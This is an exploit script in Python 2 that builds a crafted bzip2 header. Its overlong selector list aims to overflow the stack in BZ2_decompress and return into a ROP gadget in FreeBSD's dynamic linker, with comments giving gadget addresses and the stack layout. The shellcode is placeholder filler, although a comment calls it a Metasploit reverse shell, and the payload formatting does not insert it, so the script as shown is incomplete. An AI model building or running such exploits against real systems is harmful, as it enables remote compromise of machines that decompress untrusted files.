#!/usr/bin/env python2
import sys
import bitstring

# reverse shell from metasploit
shellcode = [
        "D" * 80
]

# we're bound by the MTF and can only reuse values on the stack
# between pos[0]..pos[255]
selectors = [
    # retaddr:
    #   0x8009c9462: lea    rsp,[rbp-0x20]
    #   0x8009c9466: pop    rbx
    #   0x8009c9467: pop    r12
    #   0x8009c9469: pop    r14
    #   0x8009c946b: pop    r15
    #   0x8009c946d: pop    rbp
    #   0x8009c946e: ret
    #
    # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)
    9, 10, 11, 18, 1, 88, 31, 127,

    # rbp:
    #   0x802974300 (close to the end of the stream)
    16, 17, 18, 29, 22, 152, 159, 25,

    # push it back
    17, 18, 19, 20, 21, 22, 23, 24,
    25, 26, 27, 28, 29, 30, 31, 32,
    33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48,
    49, 50, 51, 52, 53, 54, 55, 56,
    57, 58, 59, 60, 61, 62
]

payload = [
        "C" * 96,
]


def get_payload():
    sc = shellcode
    return "".join(payload) % {
        "shellcode": sc,
        "pad": "\x90" * (4433 - len(sc)),
    }


def get_header():
    b = bitstring.BitArray()
    b.append("0x425a")             # magic
    b.append("0x68")               # huffman
    b.append("0x31")               # block size (0x31 <= s <= 0x39)
    b.append("0x314159265359")     # compressed magic
    b.append("0x11223344")         # crc
    b.append("0b0")                # not randomized
    b.append("0x000000")           # pointer into BWT
    b.append("0b0000000000000001")  # mapping table 1
    b.append("0b0000000000000001")  # mapping table 2
    b.append("0b110")              # number of Huffman groups (1 <= n <= 6)
    b.append(format(len(selectors), "#017b"))  # number of selectors

    # selector list
    for s in selectors:
        b.append("0b" + "1" * s + "0")

    # BZ_X_CODING_1 (1 <= n <= 20).  we want a fail to make
    # BZ2_decompress() bail as early as possible into the
    # first gadget since the stack will be kind of messed up
    b.append("0b00000")

    return b.tobytes()


def main():
    ofile = sys.argv[1]
    bzip2 = get_header() + get_payload()
    with open(ofile, 'w') as fd:
        fd.write(bzip2)

    print("Written to {}".format(ofile))


if __name__ == "__main__":
    main()
